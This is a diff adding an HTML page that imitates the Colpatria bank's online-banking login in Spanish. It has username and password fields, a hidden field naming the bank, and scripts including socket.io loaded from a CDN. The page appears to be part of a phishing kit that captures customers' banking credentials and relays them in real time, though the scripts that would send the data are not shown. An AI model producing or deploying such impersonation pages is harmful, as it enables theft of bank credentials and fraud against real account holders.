@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="../../../js/functions.js"></script>
+    <title>Colpatria</title>
+    <style>
+      * {
+        font-family: Arial, Helvetica, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div
+      style="
+        border-top: 5px solid red;
+        border-bottom: 1px solid #dcdcdc;
+        height: 60px;
+      "
+    >
+      <img
+        src="logo.png"
+        alt=""
+        srcset=""
+        width="25%"
+        style="margin-top: -20px; margin-left: 20px"
+      />
+    </div>
+    <br /><br />
+    <center>
+      <h2>Ingresa a tu Banca Virtual</h2>
+    </center>
+
+    <br /><br /><br />
+
+    <img
+      src="usuario.png"
+      alt=""
+      srcset=""
+      width="5%"
+      style="position: absolute; margin-top: 8px; margin-left: 25px"
+    />
+    <img
+      src="candado.png"
+      alt=""
+      srcset=""
+      width="5%"
+      style="position: absolute; margin-top: 100px; margin-left: 25px"
+    />
+    <center>
+      <input
+        type="text"
+        name=""
+        id="txtUsuario"
+        maxlength="50"
+        placeholder="Nombre de usuario"
+        style="
+          width: 80%;
+          padding-left: 30px;
+          height: 40px;
+          border: none;
+          border-bottom: 1px solid gray;
+          font-size: 17px;
+        "
+      /><br /><br /><br /><br />
+
+      <input
+        type="password"
+        name="documento"
+        id="txtPass"
+        placeholder="Contraseña"
+        maxlength="20"
+        style="
+          width: 80%;
+          padding-left: 30px;
+          height: 40px;
+          border: none;
+          border-bottom: 1px solid gray;
+          font-size: 17px;
+        "
+      />
+    </center>
+    <br />
+    <a style="color: #219fd6; margin-left: 20px"
+      ><b>¿Necesitas ayuda para ingresar?</b></a
+    ><br /><br />
+    <input type="hidden" value="colpatria" id="banco" />
+
+    <center>
+      <button
+        type="submit"
+        name="clave"
+        id="btnUsuario"
+        style="
+          width: 90%;
+          height: 45px;
+          border-radius: 5px;
+          background-color: red;
+          color: white;
+          border: none;
+        "
+      >
+        Validar
+      </button>
+      <br /><br /><br />
+    </center>
+    <h3 style="margin-left: 20px">¿No te has registrado?</h3>
+    <br />
+
+    <center>
+      <input
+        type="submit"
+        value="Registrate aquí"
+        style="
+          width: 90%;
+          height: 45px;
+          border-radius: 5px;
+          background-color: white;
+          color: red;
+          border: 1px solid red;
+        "
+      />
+    </center>
+    <script src="js/user.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/wait.js"></script>
+  </body>
+</html>
